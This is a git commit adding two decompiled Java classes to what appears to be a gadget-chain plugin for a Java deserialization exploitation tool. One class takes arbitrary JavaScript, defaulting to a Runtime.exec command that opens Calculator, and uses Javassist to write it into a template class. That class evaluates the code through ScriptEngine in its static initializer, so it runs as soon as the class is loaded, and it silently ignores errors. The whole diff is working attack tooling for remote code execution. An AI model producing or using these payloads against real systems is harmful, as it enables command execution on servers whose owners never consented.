141f5737722ce530cec68eb27306136703105121
se1zer <yx2284881304@163.com>
2026-03-03 15:27:41 +0800

    补充Bytecode:JS执行

---
+++ src/main/java/com/ar3h/plugin/fr/JsCodeExec.java
@@ -0,0 +1,48 @@
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package com.ar3h.plugin.fr;
+
+import com.ar3h.chains.common.Gadget;
+import com.ar3h.chains.common.GadgetChain;
+import com.ar3h.chains.common.GadgetContext;
+import com.ar3h.chains.common.annotations.GadgetAnnotation;
+import com.ar3h.chains.common.annotations.GadgetTags;
+import com.ar3h.chains.common.param.Param;
+import com.ar3h.chains.common.util.JavassistHelper;
+import com.ar3h.plugin.fr.template.JsCodeExecBytecode;
+import org.apache.commons.lang.StringEscapeUtils;
+
+@GadgetTags(
+        tags = {"Bytecode", "END"}
+)
+@GadgetAnnotation(
+        name = "执行Js命令",
+        description = "使用ScriptEngine执行JS代码",
+        authors = {"se1zer"},
+        priority = 10
+)
+public class JsCodeExec implements Gadget {
+    @Param(
+            name = "Js代码",
+            description = "default: Runtime.getRuntime().exec('open -a Calculator')"
+    )
+    public String code = "java.lang.Runtime.getRuntime().exec('open -a Calculator')";
+
+    public JsCodeExec() {
+    }
+
+    public byte[] getObject() {
+        String javaSafeCode = StringEscapeUtils.escapeJava(this.code);
+        JavassistHelper javassistHelper = new JavassistHelper(JsCodeExecBytecode.class);
+        javassistHelper.modifyStringField("code", javaSafeCode);
+        return javassistHelper.getBytecode();
+    }
+
+    public Object invoke(GadgetContext context, GadgetChain chain) throws Exception {
+        chain.doCreate(context);
+        return this.getObject();
+    }
+}
---
+++ src/main/java/com/ar3h/plugin/fr/template/JsCodeExecBytecode.java
@@ -0,0 +1,23 @@
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package com.ar3h.plugin.fr.template;
+
+import javax.script.ScriptEngineManager;
+
+public class JsCodeExecBytecode {
+    public static String code;
+
+    public JsCodeExecBytecode() {
+        try {
+            new ScriptEngineManager().getEngineByName("js").eval(code);
+        } catch (Exception e) {
+        }
+    }
+
+    static {
+        new JsCodeExecBytecode();
+    }
+}
